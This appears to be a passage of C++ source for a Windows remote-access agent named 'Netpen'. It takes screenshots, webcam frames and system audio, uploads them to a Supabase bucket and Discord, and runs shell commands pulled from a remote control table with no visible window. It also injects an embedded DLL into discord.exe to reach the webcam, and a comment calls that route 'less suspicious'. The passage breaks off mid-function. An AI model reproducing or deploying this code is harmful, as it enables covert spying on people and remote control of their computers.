static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(codecs[i].MimeType, format) == 0) { *clsid = codecs[i].Clsid; free(codecs); return i; }
    }
    free(codecs);
    return -1;
}

static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc);

// Capture the primary monitor to a JPEG file. Uses GDI+ with quality=80.
// Cleans up all GDI handles before returning.
static bool CaptureScreen(const char* outputPath) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    int w = GetDeviceCaps(hScreenDC, HORZRES);
    int h = GetDeviceCaps(hScreenDC, VERTRES);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) < 0) {
        DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
        return false;
    }

    Gdiplus::EncoderParameters eps;
    eps.Count = 1;
    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    UINT q = 80;
    eps.Parameter[0].Value = &q;

    bool ok = bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok;
    DeleteObject(hBitmap); DeleteDC(hMemDC); ReleaseDC(NULL, hScreenDC);
    return ok;
}

// Capture a single webcam frame via DirectShow. Builds a filter graph:
// VideoCapture → SampleGrabber → NullRenderer, waits up to 5s for a frame,
// converts RGB24 to GDI+ Bitmap, saves as JPEG quality=80.
// Falls back gracefully if no camera is connected.
static bool CaptureWebcamFrame(const char* outputPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IMediaControl* pControl = NULL;
    IBaseFilter* pCapFilter = NULL;
    IBaseFilter* pNullFilter = NULL;
    IBaseFilter* pGrabberBase = NULL;
    ISampleGrabber* pGrabber = NULL;
    do {
        CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
        CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pBuilder);
        if (!pGraph || !pBuilder) break;
        pBuilder->SetFiltergraph(pGraph);
        ICreateDevEnum* pDevEnum = NULL;
        IEnumMoniker* pEnum = NULL;
        if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum))) break;
        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        pDevEnum->Release();
        if (FAILED(hr) || !pEnum) break;
        IMoniker* pMoniker = NULL;
        if (pEnum->Next(1, &pMoniker, NULL) != S_OK) { pEnum->Release(); break; }
        pEnum->Release();
        if (FAILED(pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCapFilter))) { pMoniker->Release(); break; }
        pMoniker->Release();
        pGraph->AddFilter(pCapFilter, L"Capture");
        CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_ISampleGrabber, (void**)&pGrabber);
        if (!pGrabber) break;
        if (FAILED(pGrabber->QueryInterface(IID_IBaseFilter, (void**)&pGrabberBase))) break;
        AM_MEDIA_TYPE mt;
        ZeroMemory(&mt, sizeof(mt));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        pGrabber->SetMediaType(&mt);
        pGraph->AddFilter(pGrabberBase, L"Grabber");
        CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullFilter);
        if (pNullFilter) pGraph->AddFilter(pNullFilter, L"Null");
        if (FAILED(pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCapFilter, pGrabberBase, pNullFilter))) break;
        pGrabber->SetOneShot(TRUE);
        pGrabber->SetBufferSamples(TRUE);
        if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl))) break;
        if (FAILED(pControl->Run())) break;
        DWORD waitStart = GetTickCount();
        bool gotSample = false;
        while (GetTickCount() - waitStart < 5000) {
            OAFilterState state;
            pControl->GetState(10, &state);
            if (state == State_Running) { Sleep(2000); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
            Sleep(100);
        }
        if (!gotSample) break;
        long cbBuffer = 0;
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, NULL))) break;
        BYTE* pBuffer = new BYTE[cbBuffer];
        if (FAILED(pGrabber->GetCurrentBuffer(&cbBuffer, (long*)pBuffer))) { delete[] pBuffer; break; }
        AM_MEDIA_TYPE actualMt;
        ZeroMemory(&actualMt, sizeof(actualMt));
        if (FAILED(pGrabber->GetConnectedMediaType(&actualMt))) { delete[] pBuffer; break; }
        VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)actualMt.pbFormat;
        if (actualMt.formattype == FORMAT_VideoInfo && actualMt.cbFormat >= sizeof(VIDEOINFOHEADER) && vih) {
            LONG w = vih->bmiHeader.biWidth;
            LONG h = abs(vih->bmiHeader.biHeight);
            BITMAPINFO bmi;
            ZeroMemory(&bmi, sizeof(bmi));
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = w;
            bmi.bmiHeader.biHeight = -h;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = BI_RGB;
            HDC hdc = GetDC(NULL);
            HBITMAP hBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, NULL, NULL, 0);
            if (hBmp) {
                SetBitmapBits(hBmp, cbBuffer, pBuffer);
                Gdiplus::Bitmap bitmap(hBmp, NULL);
                CLSID clsid;
                if (GetEncoderClsid(L"image/jpeg", &clsid) >= 0) {
                    Gdiplus::EncoderParameters eps;
                    eps.Count = 1;
                    eps.Parameter[0].Guid = Gdiplus::EncoderQuality;
                    eps.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    eps.Parameter[0].NumberOfValues = 1;
                    UINT q = 80;
                    eps.Parameter[0].Value = &q;
                    result = (bitmap.Save(ToWide(outputPath).c_str(), &clsid, &eps) == Gdiplus::Ok);
                }
                DeleteObject(hBmp);
            }
            ReleaseDC(NULL, hdc);
        }
        if (actualMt.pbFormat) CoTaskMemFree(actualMt.pbFormat);
        delete[] pBuffer;
    } while (false);
    if (pControl) { pControl->Stop(); pControl->Release(); }
    if (pGrabberBase) pGrabberBase->Release();
    if (pGrabber) pGrabber->Release();
    if (pNullFilter) pNullFilter->Release();
    if (pCapFilter) pCapFilter->Release();
    if (pBuilder) pBuilder->Release();
    if (pGraph) pGraph->Release();
    CoUninitialize();
    return result;
}

// Capture 10 seconds of system audio (loopback) to a WAV file. Uses WASAPI
// in shared loopback mode. Handles both PCM and IEEE Float formats — converts
// float to 16-bit PCM if needed. Saved at the original sample rate/channels.
static bool CaptureSpeaker(const char* outputPath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IMMDeviceEnumerator* pEnum = NULL;
    IMMDevice* pDevice = NULL;
    IAudioClient* pClient = NULL;
    IAudioCaptureClient* pCapture = NULL;
    do {
        if (FAILED(CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnum))) break;
        if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) break;
        if (FAILED(pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pClient))) break;
        WAVEFORMATEX* pMixFormat = NULL;
        if (FAILED(pClient->GetMixFormat(&pMixFormat))) break;
        REFERENCE_TIME bufDuration = 10000000;
        if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, bufDuration, 0, pMixFormat, NULL))) { CoTaskMemFree(pMixFormat); break; }
        if (FAILED(pClient->GetService(IID_IAudioCaptureClient, (void**)&pCapture))) { CoTaskMemFree(pMixFormat); break; }
        UINT32 bytesPerFrame = pMixFormat->nBlockAlign;
        UINT32 estimatedBytes = pMixFormat->nSamplesPerSec * bytesPerFrame * 10;
        std::vector<BYTE> audioBuffer;
        audioBuffer.reserve(estimatedBytes + 44);
        struct WAVHDR { char id[4]; uint32_t sz; char wave[4]; char fId[4]; uint32_t fsz; uint16_t tag; uint16_t ch; uint32_t sr; uint32_t br; uint16_t ba; uint16_t bps; char dId[4]; uint32_t dsz; } hdr;
        memcpy(hdr.id, "RIFF", 4); memcpy(hdr.wave, "WAVE", 4); memcpy(hdr.fId, "fmt ", 4); memcpy(hdr.dId, "data", 4);
        hdr.fsz = 16; hdr.tag = pMixFormat->wFormatTag; hdr.ch = pMixFormat->nChannels;
        hdr.sr = pMixFormat->nSamplesPerSec; hdr.br = pMixFormat->nAvgBytesPerSec;
        hdr.ba = pMixFormat->nBlockAlign; hdr.bps = pMixFormat->wBitsPerSample;
        hdr.dsz = 0; hdr.sz = 0;
        audioBuffer.insert(audioBuffer.end(), (BYTE*)&hdr, (BYTE*)&hdr + sizeof(hdr));
        if (FAILED(pClient->Start())) { CoTaskMemFree(pMixFormat); break; }
        DWORD startTime = GetTickCount();
        while (GetTickCount() - startTime < 10000) {
            UINT32 packets = 0;
            while (SUCCEEDED(pCapture->GetNextPacketSize(&packets)) && packets > 0) {
                BYTE* pData = NULL; UINT32 frames = 0; DWORD flags = 0;
                if (FAILED(pCapture->GetBuffer(&pData, &frames, &flags, NULL, NULL))) break;
                if (frames > 0 && !(flags & AUDCLNT_BUFFERFLAGS_SILENT))
                    audioBuffer.insert(audioBuffer.end(), pData, pData + frames * bytesPerFrame);
                else if (frames > 0)
                    audioBuffer.insert(audioBuffer.end(), frames * bytesPerFrame, 0);
                pCapture->ReleaseBuffer(frames);
            }
            if (packets == 0) Sleep(15);
        }
        pClient->Stop();

        bool isFloat = (pMixFormat->wFormatTag == WAVE_FORMAT_IEEE_FLOAT);
        WORD savedChannels = pMixFormat->nChannels;
        DWORD savedSamplesPerSec = pMixFormat->nSamplesPerSec;
        CoTaskMemFree(pMixFormat);

        if (isFloat) {
            size_t dataOffset = sizeof(WAVHDR);
            size_t floatBytes = audioBuffer.size() - dataOffset;
            size_t numSamples = floatBytes / 4;
            size_t pcmBytes = numSamples * 2;
            std::vector<BYTE> pcm(dataOffset + pcmBytes);
            memcpy(pcm.data(), audioBuffer.data(), dataOffset);
            float* src = (float*)(audioBuffer.data() + dataOffset);
            int16_t* dst = (int16_t*)(pcm.data() + dataOffset);
            for (size_t i = 0; i < numSamples; i++) {
                float s = src[i];
                if (s < -1.0f) s = -1.0f;
                if (s > 1.0f) s = 1.0f;
                dst[i] = (int16_t)(s * 32767.0f);
            }
            audioBuffer.swap(pcm);
        }

        {
            size_t totalData = audioBuffer.size() - sizeof(hdr);
            WAVHDR* wh = (WAVHDR*)audioBuffer.data();
            if (isFloat) {
                wh->tag = WAVE_FORMAT_PCM;
                wh->bps = 16;
                wh->ba = savedChannels * 2;
                wh->br = savedSamplesPerSec * wh->ba;
            }
            wh->dsz = (uint32_t)totalData;
            wh->sz = (uint32_t)(totalData + sizeof(hdr) - 8);
        }
        HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hFile, audioBuffer.data(), (DWORD)audioBuffer.size(), &written, NULL);
            CloseHandle(hFile);
            result = written == audioBuffer.size();
        }
    } while (false);
    if (pCapture) pCapture->Release();
    if (pClient) pClient->Release();
    if (pDevice) pDevice->Release();
    if (pEnum) pEnum->Release();
    CoUninitialize();
    return result;
}

// Compact timestamp for screenshot filenames (e.g. "20250706_123045").
static std::string GetScreenshotTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", tm);
    return std::string(buf);
}

// Upload a local file to Supabase Storage via PUT. Uses the service role key
// (g_supabaseServiceKey) for write access. 30s timeouts for large files.
// Deletes the local temp copy after upload in the caller.
static bool UploadToStorage(const std::string& localPath, const std::string& storagePath, const char* contentType) {
    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return false; }
    char* buf = new char[size];
    DWORD read = 0;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) { delete[] buf; CloseHandle(hFile); return false; }
    CloseHandle(hFile);

    HINTERNET hSession = WinHttpOpen(AGENT_UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { delete[] buf; return false; }
    WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); delete[] buf; return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"PUT", ToWide(storagePath).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); delete[] buf; return false; }

    std::wstring headers = L"apikey: " + g_supabaseServiceKey + L"\r\nAuthorization: Bearer " + g_supabaseServiceKey + L"\r\nContent-Type: " + ToWide(contentType) + L"\r\nx-upsert: true";

    bool ok = false;
    if (WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), buf, size, size, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD sc = 0, sl = sizeof(sc);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &sc, &sl, NULL);
            ok = (sc >= 200 && sc < 300);
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    delete[] buf;
    return ok;
}

// Execute a cmd.exe /c command synchronously and return stdout+stderr. Caps
// output at 32KB. Kills the process if it runs longer than 60s. Returns the
// exit code via optional out parameter.
static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = NULL) {
    std::string result;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdOutRd, hStdOutWr;
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)) { if (outExitCode) *outExitCode = -1; return ""; }
    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWr;
    si.hStdError = hStdOutWr;
    std::string cmdLine = "cmd.exe /c " + cmd;
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, sysDir, &si, &pi)) {
        CloseHandle(hStdOutWr); CloseHandle(hStdOutRd);
        if (outExitCode) *outExitCode = -1;
        return "";
    }
    CloseHandle(hStdOutWr);
    DWORD startTime = GetTickCount();
    char buf[4096];
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail > 0) {
            DWORD read = 0;
            DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
            if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
                buf[read] = 0;
                result += buf;
                if (result.size() > 32000) { result = result.substr(0, 32000); result += "...[truncated]"; break; }
            }
        }
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 200);
        if (waitResult == WAIT_OBJECT_0) break;
        if (waitResult == WAIT_TIMEOUT && GetTickCount() - startTime > 60000) {
            TerminateProcess(pi.hProcess, 1);
            result += "\n[timed out after 60s]";
            break;
        }
    }
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail == 0) break;
        DWORD read = 0;
        DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
        if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
            buf[read] = 0;
            result += buf;
            if (result.size() > 32000) break;
        }
    }
    CloseHandle(hStdOutRd);
    DWORD exitCode = -1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    if (outExitCode) *outExitCode = exitCode;
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result;
}

// Poll Supabase control table for a pending "exec" command. Runs the command
// via ExecuteCommand and POSTs the result + exit code to exec_results.
static void CheckAndHandleExec() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id,payload";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    if (resp.size() < 10) return;
    std::string rowId = ExtractJSONNumber(resp, "id");
    std::string payload = ExtractJSONString(resp, "payload");
    if (rowId.empty() || payload.empty()) return;
    DWORD exitCode = 0;
    std::string output = ExecuteCommand(payload, &exitCode);
    if (output.empty()) output = "(no output)";
    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"" + EscapeJSON(payload) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
    json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Exec: " + payload + " -> exit " + std::to_string((int)exitCode));
}

// === Remote command handlers ===================================================
// Each CheckXxxCmd() polls Supabase control for a pending command by type.
// Returns the row ID if found. The caller passes it HandleXxx() which does
// the work (capture + upload) and PATCHes executed=true.

// Poll for a pending "screenshot" command.
static std::string CheckScreenshotCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

// Capture the screen, upload to Storage, PATCH the row, post the result to Discord.
static void HandleScreenshot(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string slug = SafeHostSlug(g_hostname);
    std::string localFile = std::string(tmp) + "NetpenShot_" + slug + "_" + ts + ".jpg";
    std::string storageFile = "screenshots/" + slug + "_" + ts + ".jpg";

    if (!CaptureScreen(localFile.c_str())) { LogMsg("Screenshot: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Screenshot: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

    std::string resultUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co/storage/v1/object/public/Netpen/" + storageFile;
    std::string json = "{\"executed\":true,\"result_url\":\"" + EscapeJSON(resultUrl) + "\"}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    std::string resp;
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);

    std::string host = g_hostname.empty() ? "unknown" : g_hostname;
    PostDiscordImage(host, "Netpen \u2014 " + host + " Screenshot", resultUrl, "");

    DeleteFileA(localFile.c_str());
    LogMsg("Screenshot done: " + resultUrl);
}

// Poll for a pending "webcam" command.
static std::string CheckWebcamCmd() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + HostFilterEq() + L"&select=id";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
    size_t p = resp.find("\"id\":");
    if (p == std::string::npos) return "";
    p += 5;
    size_t e = resp.find_first_of("},]", p);
    if (e == std::string::npos) return "";
    return resp.substr(p, e - p);
}

// Find a process by executable name, returns PID or 0.
static DWORD FindProcessPid(const wchar_t* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// Extract the embedded Discord capture DLL (resource ID 101) to a temp file.
// The temp name includes a timestamp for uniqueness.
static bool ExtractDllToTemp(std::string& outPath) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hGlob = LoadResource(NULL, hRes);
    void* data = LockResource(hGlob);
    DWORD size = SizeofResource(NULL, hRes);
    if (!data || size == 0) return false;
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);
    outPath = std::string(tmpDir) + "discord_cap_" + std::to_string(GetTickCount()) + ".dll";
    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    bool ok = (WriteFile(hFile, data, size, &written, NULL) && written == size);
    CloseHandle(hFile);
    if (!ok) { DeleteFileA(outPath.c_str()); return false; }
    return true;
}

// Inject the webcam-capture DLL into Discord.exe via CreateRemoteThread.
// 1. Extract DLL to temp
// 2. VirtualAllocEx for DLL path and CaptureParams in remote process
// 3. CreateRemoteThread(LoadLibraryW) to load the DLL
// 4. Enumerate Discord's modules to find the DLL's base address
// 5. CreateRemoteThread(CaptureThread) with CaptureParams (output path)
// Returns true if the DLL was loaded and CaptureThread completed.
static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
    DWORD pid = FindProcessPid(L"discord.exe");
    if (!pid) { LogMsg("Webcam injection: Discord.exe not found"); return false; }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { LogMsg("Webcam injection: OpenProcess failed"); return false; }

    std::string dllPathA;
    if (!ExtractDllToTemp(dllPathA)) { LogMsg("Webcam injection: DLL extract failed"); CloseHandle(hProcess); return false; }
    LogMsg("Webcam injection: DLL extracted to temp");

    int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, NULL, 0);
    std::wstring dllPathW((size_t)wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, &dllPathW[0], wlen);

    // Extract base filename for module enumeration (DLL was renamed to a random temp name)
    std::wstring dllBaseNameW = dllPathW;
    size_t slashPos = dllBaseNameW.find_last_of(L"\\/");
    if (slashPos != std::wstring::npos) dllBaseNameW = dllBaseNameW.substr(slashPos + 1);

    size_t dllPathBytes = (dllPathW.size() + 1) * sizeof(wchar_t);
    void* remoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathBytes, MEM_COMMIT, PAGE_READWRITE);
    void* remoteParams = VirtualAllocEx(hProcess, NULL, sizeof(CaptureParams), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllPath || !remoteParams) {
        if (remoteDllPath) VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        if (remoteParams) VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: VirtualAllocEx failed"); return false;
    }

    WriteProcessMemory(hProcess, remoteDllPath, dllPathW.c_str(), dllPathBytes, NULL);
    CaptureParams params;
    wcscpy_s(params.outputPath, outputPath);
    WriteProcessMemory(hProcess, remoteParams, &params, sizeof(params), NULL);

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryW, remoteDllPath, 0, NULL);
    if (!hLoadThread) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: CreateRemoteThread(LoadLibraryW) failed"); return false;
    }
    WaitForSingleObject(hLoadThread, 10000);
    CloseHandle(hLoadThread);
    LogMsg("Webcam injection: DLL loaded into Discord");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    ULONGLONG remoteDllBase = 0;
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(hSnapshot, &me)) {
            do {
                if (lstrcmpiW(me.szModule, dllBaseNameW.c_str()) == 0) { remoteDllBase = (ULONGLONG)me.modBaseAddr; break; }
            } while (Module32NextW(hSnapshot, &me));
        }
        CloseHandle(hSnapshot);
    }

    if (!remoteDllBase) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: DLL not found in Discord module list"); return false;
    }

    HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
    if (!hLocalDll) {
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
    }

    FARPROC localExport = GetProcAddress(hLocalDll, "CaptureThread");
    if (!localExport) { FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }

    ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
    HANDLE hCapThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), remoteParams, 0, NULL);
    if (!hCapThread) { LogMsg("Webcam injection: CreateRemoteThread(CaptureThread) failed"); FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
    LogMsg("Webcam injection: CaptureThread started in Discord");

    WaitForSingleObject(hCapThread, 30000);
    CloseHandle(hCapThread);
    LogMsg("Webcam injection: CaptureThread completed");
    FreeLibrary(hLocalDll);
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    DeleteFileA(dllPathA.c_str());
    LogMsg("Webcam: injected into Discord PID " + std::to_string(pid));
    return true;
}

// Try Discord injection first (higher quality, less suspicious), fall back to
// direct DirectShow capture. Upload the result to Storage and post to Discord.
static void HandleWebcam(const std::string& rowId) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string ts = GetScreenshotTimestamp();
    std::string slug = SafeHostSlug(g_hostname);
    std::string localFile = std::string(tmp) + "NetpenCam_" + slug + "_" + ts + ".jpg";
    std::string storageFile = "webcam/" + slug + "_" + ts + ".jpg";

    std::wstring localFileW = ToWide(localFile);
    if (InjectAndCaptureWebcam(localFileW.c_str())) { LogMsg("Webcam: captured via Discord injection"); }
    else if (!CaptureWebcamFrame(localFile.c_str())) { LogMsg("Webcam: capture failed"); return; }
    std::string storagePath = "/storage/v1/object/Netpen/" + storageFile;
    if (!UploadToStorage(localFile, storagePath, "image/jpeg")) {
        LogMsg("Webcam: upload failed");
        DeleteFileA(localFile.c_str());
        return;
    }

